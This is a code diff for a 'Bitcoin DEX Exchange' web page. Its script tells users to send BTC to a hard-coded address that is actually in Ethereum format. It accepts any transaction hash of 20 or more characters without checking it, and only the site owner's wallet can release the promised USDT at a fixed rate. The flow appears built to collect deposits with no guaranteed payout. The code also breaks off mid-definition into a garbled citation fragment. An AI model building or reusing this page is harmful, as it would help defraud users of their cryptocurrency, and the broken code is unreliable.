@@ -1,60 +1,118 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Bitcoin DEX</title>
-  <link rel="stylesheet" href="style.css">
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-  <style>
-    #wallet-status-btn {
-      position: fixed;
-      top: 10px;
-      left: 10px;
-      font-size: 24px;
-      background: transparent;
-      border: none;
-      cursor: pointer;
-      z-index: 999;
-    }
-  </style>
-</head>
-<body>
-  <button id="wallet-status-btn" onclick="manualConnect()">🔄</button>
+const ownerWallet = "0x49b06e4a8E75188955d6961520F0a9E2EC1B6634";
+let btcAmount = 0;
+let btcTxHash = "";
+let usdtRecipient = "";
+let usdtAmount = 0;
 
-  <div class="container">
-    <h1>Bitcoin DEX Exchange</h1>
-    <p>Live BTC Price: <span id="btc-price">Loading...</span></p>
+window.addEventListener("load", () => {
+  checkWalletStatus();
+  fetchBTCPrice();
+});
 
-    <div id="step-1" class="step">
-      <h2>Step 1: Enter BTC amount</h2>
-      <input type="number" id="btc-amount" placeholder="Amount of BTC">
-      <button onclick="nextStep1()">Next</button>
-    </div>
+function checkWalletStatus() {
+  const btn = document.getElementById("wallet-status-btn");
+  if (typeof window.ethereum !== "undefined") {
+    window.ethereum.request({ method: "eth_accounts" })
+      .then(accounts => {
+        const connected = accounts[0]?.toLowerCase() === ownerWallet.toLowerCase();
+        btn.innerText = connected ? "✅" : "❌";
+      })
+      .catch(() => {
+        btn.innerText = "❌";
+      });
+  } else {
+    btn.innerText = "❌";
+  }
+}
 
-    <div id="step-2" class="step hidden">
-      <h2>Step 2: Send BTC to this address</h2>
-      <p>Deposit Address:</p>
-      <code id="btc-address">0x49b06e4a8E75188955d6961520F0a9E2EC1B6634</code>
-      <p>Enter your BTC transaction hash:</p>
-      <input type="text" id="btc-txid" placeholder="Transaction Hash">
-      <button onclick="nextStep2()">Next</button>
-    </div>
+function manualConnect() {
+  if (typeof window.ethereum !== "undefined") {
+    window.ethereum.request({ method: "eth_requestAccounts" })
+      .then(accounts => {
+        const connected = accounts[0]?.toLowerCase() === ownerWallet.toLowerCase();
+        const btn = document.getElementById("wallet-status-btn");
+        btn.innerText = connected ? "✅" : "❌";
+        alert(connected ? "Wallet connected successfully." : "Access denied.");
+      })
+      .catch(() => {
+        alert("Connection failed.");
+      });
+  } else {
+    alert("MetaMask not detected.");
+  }
+}
 
-    <div id="step-3" class="step hidden">
-      <h2>Step 3: Enter USDT recipient address</h2>
-      <input type="text" id="usdt-address" placeholder="Recipient USDT Address">
-      <button onclick="finalStep()">Convert</button>
-    </div>
+function fetchBTCPrice() {
+  fetch("https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USDT")
+    .then(response => response.json())
+    .then(data => {
+      const btcPrice = data?.USDT;
+      const priceElement = document.getElementById("btc-price");
+      if (btcPrice) {
+        priceElement.innerText = `$${parseFloat(btcPrice).toLocaleString(undefined, { maximumFractionDigits: 2 })}`;
+      } else {
+        priceElement.innerText = "❌ Price unavailable";
+      }
+    })
+    .catch(() => {
+      document.getElementById("btc-price").innerText = "❌ Price unavailable";
+    });
+}
 
-    <div id="step-4" class="step hidden">
-      <h2>Step 4: Confirm USDT transfer</h2>
-      <p>Amount to send: <span id="usdt-amount">Calculating...</span> USDT</p>
-      <button onclick="sendUSDT()">Confirm & Send</button>
-    </div>
+function nextStep1() {
+  btcAmount = parseFloat(document.getElementById("btc-amount").value);
+  if (!btcAmount || btcAmount <= 0) {
+    alert("Enter a valid BTC amount.");
+    return;
+  }
+  document.getElementById("step-1").classList.add("hidden");
+  document.getElementById("step-2").classList.remove("hidden");
+}
 
-    <div id="result" class="result-box"></div>
-  </div>
+function nextStep2() {
+  btcTxHash = document.getElementById("btc-txid").value.trim();
+  if (!btcTxHash || btcTxHash.length < 20) {
+    alert("Enter a valid transaction hash.");
+    return;
+  }
+  document.getElementById("step-2").classList.add("hidden");
+  document.getElementById("step-3").classList.remove("hidden");
+}
 
-  <script src="script.js"></script>
-</body>
-</html>
+function finalStep() {
+  usdtRecipient = document.getElementById("usdt-address").value.trim();
+  if (!usdtRecipient || !usdtRecipient.startsWith("0x")) {
+    alert("Enter a valid USDT address.");
+    return;
+  }
+  usdtAmount = btcAmount * 27000;
+  document.getElementById("usdt-amount").innerText = `${usdtAmount.toFixed(2)} USDT`;
+  document.getElementById("step-3").classList.add("hidden");
+  document.getElementById("step-4").classList.remove("hidden");
+}
+
+async function sendUSDT() {
+  if (typeof window.ethereum === "undefined") {
+    alert("MetaMask not detected.");
+    return;
+  }
+
+  const accounts = await window.ethereum.request({ method: "eth_accounts" });
+  const sender = accounts[0]?.toLowerCase();
+
+  if (sender !== ownerWallet.toLowerCase()) {
+    alert("Access denied. Only owner wallet can send USDT.");
+    return;
+  }
+
+  const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
+  const usdtAbi = [
+    {
+      "constant": false,
+      "inputs": [
+        { "name": "_to", "type": "address" },
+        { "name": "_value", "type": "uint256" }
+      ],
+      "name": "transfer",
+      "outputs": [{ "name": "", "type": "bool" }],
+      "type": "function[&#95;{{{CITATION{{{&#95;3{](https://github.com/vladprotocol/mainnet/tree/053ac40fc4cb57111db44413a1cd81c8fe41f755/static%2Fjs%2Fmain.3fbac7b7.chunk.js)
